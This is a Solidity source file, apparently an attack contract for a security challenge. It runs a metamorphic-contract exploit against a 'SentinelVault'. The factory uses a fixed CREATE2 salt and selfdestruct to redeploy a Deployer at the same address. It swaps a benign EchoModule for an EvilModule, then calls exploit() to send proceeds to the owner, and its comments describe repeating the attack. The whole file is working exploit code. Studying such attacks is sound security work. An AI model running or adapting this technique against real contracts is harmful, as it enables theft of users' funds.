// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import {Deployer} from "./Deployer.sol";
import {EvilModule} from "./EvilModule.sol";
import {console2} from "forge-std/console2.sol";

contract DeployerFactory {
    address public immutable OWNER;
    address public sentinelVaultAddr;
    bytes32 constant public SALT = bytes32(uint256(123456789));

    // Idea selfdestruct reflect change only after the full transaction is completed
    // So we need a factory deployer that works with a salt to deploy in same transaction
    modifier onlyOwner() {
        require(msg.sender == OWNER, "Not owner");
        _;
    }

    constructor(address _sentinelVaultAddr){
        OWNER = msg.sender;
        sentinelVaultAddr = _sentinelVaultAddr;
    }

    function setSentinelVault(address _sentinelVault) external onlyOwner {
        sentinelVaultAddr = _sentinelVault;
    }

    function phase1() external onlyOwner{
        console2.log("Phase 1 started");
        require(sentinelVaultAddr != address(0), "Sentinel vault not set");
        
        
        Deployer deployer = new Deployer{salt: SALT}();
        console2.log("Deployer created");
        
        deployer.setSentinel(sentinelVaultAddr);

        console2.log("Sentinel set");

        // Deploy and decommission echo module
        deployer.deployAndDestructEchoModule();
        console2.log("Deployer created EchoModule and destruct it");

        // To be able to call phase 2 successfully
        deployer.destruct();

        console2.log("Deployer destructed");
    }

    function phase2() external onlyOwner{
        require(sentinelVaultAddr != address(0), "Sentinel vault not set");
        Deployer deployer = new Deployer{salt: SALT}();
        deployer.setSentinel(sentinelVaultAddr);

        EvilModule evilModule  = EvilModule(deployer.deployEvilModule());
        evilModule.exploit(payable(OWNER));
        // To be able to repeate attack
        deployer.destruct();
    }



}